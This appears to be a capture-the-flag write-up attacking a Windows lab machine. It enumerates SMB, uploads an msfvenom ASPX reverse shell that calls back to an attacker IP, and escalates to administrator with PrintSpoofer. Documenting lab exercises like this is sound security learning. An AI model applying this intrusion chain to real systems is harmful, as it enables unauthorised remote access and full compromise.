1. Run nmap to discover any open ports from the server.
![image](https://github.com/user-attachments/assets/9d276ff9-7b4b-491e-ae79-5a5b855f47d5)
2. Trying to open the website with http protocol and it shows default IIS page.
![image](https://github.com/user-attachments/assets/74ba80c9-2e25-4304-93f2-0c873afe8b7d)
3. There is SMB service from the server (port 139 and 445 are opened). So, I checked the content inside with smbclient tool.
![image](https://github.com/user-attachments/assets/3c671145-e066-46da-b01a-6dafb7eefa28)
4. There is a folder named nt4wrskv as my main focus and found a password.txt file inside.
![image](https://github.com/user-attachments/assets/7f401a1f-0c42-48f5-8eef-95df2e2d8903)
5. Open the password.txt file in my local machine and it shows base64 encoded string inside. I tried to decode and it results username and password data. But, I'm not use the file contents for this case. <br>
![image](https://github.com/user-attachments/assets/68631caf-53eb-480a-861c-b56b506b2fe2)
6. In nt4wrskv folder, I can write or modified the content inside. So, I made a reverse shell file that has .aspx extension to execute it from the browser later. <br>
**Command: msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.21.155.12 lport=7777 -f aspx -o shell.aspx** <br>
![image](https://github.com/user-attachments/assets/04768c2a-a505-4230-a671-f0cafb4f6027)
7. Insert it into the nt4wrskv folder inside the SMB server.
![image](https://github.com/user-attachments/assets/977ccb2c-bd35-4a64-a73b-ea36766ed9ff)
8. Set listener in my local machine with netcat and open the shell.aspx from the website in port 49663. <br>
![image](https://github.com/user-attachments/assets/29a31803-94b6-43af-b4a6-900b6a818ffe)
![image](https://github.com/user-attachments/assets/bcdb0f8a-6594-431b-affc-d73518ec8f64)
9. Successfully obtain the target shell, the user flag can be found in C:\Users\Bob\Desktop\User.txt file.
![image](https://github.com/user-attachments/assets/30784713-bd2e-4457-a25f-d31a8e8fa860)
10. For the admin privilege, I check first what the user privilege has with **whoami /priv** command.
![image](https://github.com/user-attachments/assets/00f033bf-7927-4ec3-840e-a05ca188d6d4)
11. It shows that I can impersonate my privilege. To do so, I use PrintSpoofer64.exe and insert it into nt4wrskv folder inside SMB server.
![image](https://github.com/user-attachments/assets/bb05dc70-81a2-4180-9ab1-8108e975a713)
12. Now I must execute the file from the target Windows terminal. From the terminal, the nt4wrskv folder located in C:\inetpub\wwwroot folder. <br>
![image](https://github.com/user-attachments/assets/031e3f60-95cd-4d8b-b2cd-b52de35b051d)
13. Escalate the user privilege with this command. <br>
**Command: PrintSpoofer64.exe -i -c cmd.exe** <br>
![image](https://github.com/user-attachments/assets/f6694adf-1f44-4e1b-ae68-be9abc2c5c31)
14. Successfully obtain the admin privilege, the root flag is stored in C:\Users\Administrator\Desktop\root.txt file.
![image](https://github.com/user-attachments/assets/c2e9cc30-9e48-4b49-a413-518b9989641f)
























